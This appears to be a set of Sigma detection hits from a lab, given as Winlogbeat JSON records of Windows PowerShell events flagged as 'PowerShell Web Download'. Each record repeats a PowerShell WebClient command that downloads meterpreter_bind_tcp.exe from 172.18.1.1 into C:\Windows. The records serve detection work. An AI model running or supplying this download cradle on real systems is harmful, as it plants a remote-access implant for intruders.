    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:50.838Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-10-10T11:17:51.428Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 7,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"FileSystem\" is Started. \n\nDetails: \n\tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "FileSystem",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6592,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:50.838+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:50.838Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-10-10T11:17:51.429Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 11,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Variable\" is Started. \n\nDetails: \n\tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Variable",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6594,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:50.838+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:51.107Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Pipeline Execution Details",
                    "category": [
                        "process"
                    ],
                    "code": 800,
                    "created": "2022-10-10T11:17:51.432Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 15,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Pipeline execution details for command line: $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\"). \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\") \n\nDetails: \nCommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "New-Object",
                                "type": "CommandInvocation",
                                "value": "\"New-Object\""
                            },
                            {
                                "name": "\"TypeName\"",
                                "related_command": "New-Object",
                                "type": "ParameterBinding",
                                "value": "\"System.Net.WebClient\""
                            }
                        ],
                        "value": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7",
                    "sequence": 1,
                    "total": 1
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 800,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6596,
                    "task": "Pipeline Execution Details"
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:51.107+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:51.114Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Executing Pipeline",
                    "category": [
                        "process"
                    ],
                    "code": 4103,
                    "created": "2022-10-10T11:17:51.434Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "Microsoft-Windows-PowerShell",
                    "sequence": 16,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = 99dc06f6-7551-484b-b322-01da00740dca\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 82f501e0-7931-4934-9d32-d46517111bf7\n        Pipeline ID = 1\n        Command Name = New-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 16\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "New-Object",
                                "type": "CommandInvocation",
                                "value": "\"New-Object\""
                            },
                            {
                                "name": "\"TypeName\"",
                                "related_command": "New-Object",
                                "type": "ParameterBinding",
                                "value": "\"System.Net.WebClient\""
                            }
                        ],
                        "name": "New-Object",
                        "type": "Cmdlet"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "id": "Microsoft.PowerShell",
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "activity_id": "{d359db81-dc8e-0001-e777-5ed38edcd801}",
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-PowerShell/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 4103,
                    "opcode": "To be used when operation is just executing a method",
                    "process": {
                        "pid": 4368,
                        "thread": {
                            "id": 696
                        }
                    },
                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                    "provider_name": "Microsoft-Windows-PowerShell",
                    "record_id": 6090,
                    "task": "Executing Pipeline",
                    "user": {
                        "domain": "CLIENT1",
                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
                        "name": "ssh",
                        "type": "User"
                    },
                    "version": 1
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:51.114+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:51.166Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Pipeline Execution Details",
                    "category": [
                        "process"
                    ],
                    "code": 800,
                    "created": "2022-10-10T11:17:51.433Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 17,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=17\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=1\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\"",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "Out-Default",
                                "type": "CommandInvocation",
                                "value": "\"Out-Default\""
                            }
                        ]
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7",
                    "sequence": 1,
                    "total": 1
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 800,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6597,
                    "task": "Pipeline Execution Details"
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:51.166+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:51.166Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Engine Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 403,
                    "created": "2022-10-10T11:17:51.434Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 19,
                    "type": [
                        "end"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Engine state is changed from Available to Stopped. \n\nDetails: \n\tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=19\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "engine": {
                        "new_state": "Stopped",
                        "previous_state": "Available",
                        "version": "5.1.19041.1237"
                    },
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 403,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6598,
                    "task": "Engine Lifecycle"
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:51.166+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:51.178Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Executing Pipeline",
                    "category": [
                        "process"
                    ],
                    "code": 4103,
                    "created": "2022-10-10T11:17:51.437Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "Microsoft-Windows-PowerShell",
                    "sequence": 18,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "CommandInvocation(Out-Default): \"Out-Default\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = 99dc06f6-7551-484b-b322-01da00740dca\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 82f501e0-7931-4934-9d32-d46517111bf7\n        Pipeline ID = 1\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 18\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "Out-Default",
                                "type": "CommandInvocation",
                                "value": "\"Out-Default\""
                            }
                        ],
                        "type": "Script"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "id": "Microsoft.PowerShell",
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "activity_id": "{d359db81-dc8e-0000-71de-5ed38edcd801}",
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-PowerShell/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 4103,
                    "opcode": "To be used when operation is just executing a method",
                    "process": {
                        "pid": 4368,
                        "thread": {
                            "id": 696
                        }
                    },
                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                    "provider_name": "Microsoft-Windows-PowerShell",
                    "record_id": 6091,
                    "task": "Executing Pipeline",
                    "user": {
                        "domain": "CLIENT1",
                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
                        "name": "ssh",
                        "type": "User"
                    },
                    "version": 1
                }
            }
        },
        "name": "PowerShell Web Download",
        "timestamp": "2022-10-10T11:17:51.178+00:00",
        "authors": [
            "Florian Roth"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Scripts or tools that download files"
        ],
        "id": "6e897651-f157-4d8f-aaeb-df8151488385",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"
        ]
    },
    {
        "total_hits": 15
    }
]